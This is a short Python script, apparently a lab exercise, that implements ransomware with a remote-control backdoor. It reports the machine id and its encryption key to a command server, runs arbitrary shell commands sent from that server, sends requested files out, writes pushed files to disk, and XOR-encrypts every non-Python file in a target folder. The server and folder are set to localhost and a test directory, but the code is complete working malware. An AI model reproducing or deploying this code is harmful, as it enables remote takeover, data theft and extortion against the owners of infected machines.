import socket, os, json, string, subprocess, time

C2_IP, C2_PORT = "127.0.0.1", 5000
TARGET_DIR = os.path.expanduser("~/test_folder")

def generate_key_az(size=32):
    alphabet = string.ascii_uppercase
    with open("/dev/urandom", "rb") as f:
        return "".join(alphabet[b % 26] for b in f.read(size))

def get_machine_id():
    with open("/proc/sys/kernel/random/uuid", "r") as f: return f.read().strip()

def xor_cipher(file_path, key):
    key_b = key.encode()
    try:
        with open(file_path, 'rb') as f: data = f.read()
        with open(file_path, 'wb') as f:
            f.write(bytearray(data[i] ^ key_b[i % len(key_b)] for i in range(len(data))))
    except: pass

def run_malware():
    m_id, m_key = get_machine_id(), generate_key_az(32)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((C2_IP, C2_PORT))
        s.sendall(json.dumps({"id": m_id, "key": m_key}).encode())
        while True:
            data = s.recv(4096).decode()
            if not data: break
            parts = data.split("|")
            cmd = parts[0]
            if cmd == "EXEC":
                res = subprocess.run(parts[1], shell=True, capture_output=True, text=True)
                s.sendall((res.stdout + res.stderr).encode() or b"OK")
            elif cmd == "UPLOAD":
                path = os.path.expanduser(parts[1])
                if os.path.exists(path):
                    filesize = os.path.getsize(path)
                    s.sendall(f"OK|{filesize}".encode())
                    time.sleep(0.2)
                    with open(path, "rb") as f:
                        while True:
                            chunk = f.read(4096)
                            if not chunk: break
                            s.sendall(chunk)
                else: s.sendall(b"ERROR: Fichier introuvable.")
            elif cmd == "DOWNLOAD":
                filename, filesize = parts[1], int(parts[2])
                save_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), filename)
                received = 0
                with open(save_path, "wb") as f:
                    while received < filesize:
                        chunk = s.recv(min(4096, filesize - received))
                        if not chunk: break
                        f.write(chunk); received += len(chunk)
            elif cmd in ["CRYPT", "DECRYPT"]:
                for root, _, files in os.walk(TARGET_DIR):
                    for f in files:
                        if not f.endswith(".py"): xor_cipher(os.path.join(root, f), m_key)
    except: pass
    finally: s.close()

if __name__ == "__main__":
    if not os.path.exists(TARGET_DIR): os.makedirs(TARGET_DIR)
    run_malware()
